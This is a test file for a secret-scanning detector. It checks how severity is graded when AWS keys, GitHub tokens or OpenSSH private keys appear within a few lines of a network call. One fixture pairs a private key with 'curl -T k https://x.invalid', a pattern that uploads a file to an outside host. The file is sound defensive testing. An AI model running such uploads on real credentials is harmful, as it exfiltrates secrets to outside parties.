import { expect, test } from "bun:test";
import { embeddedSecrets } from "./embedded-secret.ts";
import { AWS_KEY, GITHUB_TOKEN, KEY_BODY, PRIVATE_KEY } from "./test-secrets.ts";

test("a network call more than five lines away leaves the secret at warn", () => {
  const text = `key=${AWS_KEY}\n\n\n\n\n\ncurl https://x.invalid\n`;
  expect(embeddedSecrets(text, [7])?.severity).toBe("warn");
  expect(embeddedSecrets(text, [6])?.severity).toBe("critical");
});

test("the strongest secret is reported with the match count", () => {
  expect(embeddedSecrets(`a=${GITHUB_TOKEN}\nb=${AWS_KEY}\n`, [7])).toEqual({
    severity: "critical",
    line: 2,
    detail: "AWS access key AKIA…Q2LM (network call on line 7) (2 matches)",
  });
});

test("a private key body shorter than 64 characters is not a key", () => {
  const short = PRIVATE_KEY.replace(KEY_BODY, KEY_BODY.slice(0, 40));
  expect(embeddedSecrets(short, [])).toBeUndefined();
});

test("a send after a private key's END line counts from that line", () => {
  const key = PRIVATE_KEY.replace(KEY_BODY, Array(12).fill(KEY_BODY).join("\n"));
  expect(embeddedSecrets(`${key}\ncurl -T k https://x.invalid\n`, [15])).toEqual({
    severity: "critical",
    line: 1,
    detail: "OPENSSH PRIVATE KEY block (14 lines) (network call on line 15)",
  });
});
